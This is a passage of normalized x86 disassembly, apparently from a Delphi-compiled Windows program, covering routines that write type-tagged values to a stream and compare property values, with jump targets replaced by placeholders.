mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420fc0
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420fc0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41e8f0
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eccc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030c4
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_4041ac
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e4f0
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e630
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41ef20
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030c4
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_404150
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_420594
mov eax [ ebp - 0x8 ]
call sub_4030bc
call sub_40339c
call sub_414618
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_404150
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030c4
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_404150
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_40426c
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_420594
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ef64
mov eax [ ebp - 0x4 ]
call sub_41ef18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41ec6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420594
mov eax [ ebp - 0x4 ]
call sub_41e4f0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4182a8
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec74
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41ec2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41e79c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_403174
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e490
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_403370
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41ec74
mov eax [ ebp - 0x4 ]
call sub_41ef18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ecd3
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_403f10
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e4f0
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e508
sub_41ecf0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_42077c
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41e55c
pop ebx
pop ebp
retn 0xc
sub_41ed14
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_42077c
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e55c
pop ebx
pop ebp
retn 0x4
sub_41ed38
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_42077c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e55c
pop ebx
pop ebp
retn 0x8
sub_41ed5c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_42077c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e55c
pop ebx
pop ebp
retn 0x8
sub_41ed80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_407db4
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_407db4
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_42077c
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_407db4
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_42077c
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_407db4
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_42077c
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_42077c
mov edx esi
mov eax ebx
call sub_420594
mov dl 0xd
mov eax ebx
call sub_42077c
jmp r-xdata
sub_41ee44
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_42077c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e55c
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_42077c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e55c
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_42077c
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41e55c
jmp r-xdata
pop edx
pop ebx
retn
sub_41eeb8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_42077c
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e55c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41ee44
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41ef20
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41e55c
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41ee44
sub_41ef64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40339c
call sub_414618
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f011
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40339c
mov edx [ ebp - 0x10 ]
call sub_41481c
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_402714
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414870
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41fff8
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41f02c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4030bc
mov edx eax
mov eax [ edi ]
call sub_403388
test al al
jne r-xdata
mov al 0x1
sub_41f05c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4148a0
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4148a0
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41f0b4
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414dd0
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414dd0
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41f110
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4151ec
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4151ec
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41f168
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f1e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414c14
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_404744
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414c14
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404744
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1ee
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4045e4
retn
sub_41f1f8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407db4
test al al
jne r-xdata
mov al 0x1
sub_41f238
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4148a0
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41f1f8
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41f290
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4148a0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
push ebp
call sub_41f238
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41f238
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f310
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f3bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f3c3
lea eax [ ebp - 0x8 ]
call sub_405758
lea eax [ ebp - 0x4 ]
call sub_405758
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415250
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cffc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41f1f8
pop ecx
mov ebx eax
sub_41f3dc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f499
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415250
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cffc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4a0
lea eax [ ebp - 0x10 ]
call sub_405758
lea eax [ ebp - 0xc ]
call sub_405758
lea eax [ ebp - 0x4 ]
call sub_405758
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415250
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f310
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41f4b8
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415174
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415174
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_403430
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f530
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f5b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4150f4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_413d9c
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4150f4
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_413e10
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5be
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404968
retn
sub_41f5c8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41f02c
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41f68a ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4148a0
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
push ebp
call sub_41f05c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f0b4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f168
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f290
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f4b8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f530
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f110
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f3dc
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4148a0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f730
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f778
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404150
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f77f
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41f784
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41f80a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414618
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_42077c
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414624
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420594
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_420594
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f811
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41f818
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41f878
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_417a94
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41ee44
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41ed80
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f87f
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41f884
push ebp
mov ebp esp
push 0x0
push ebx
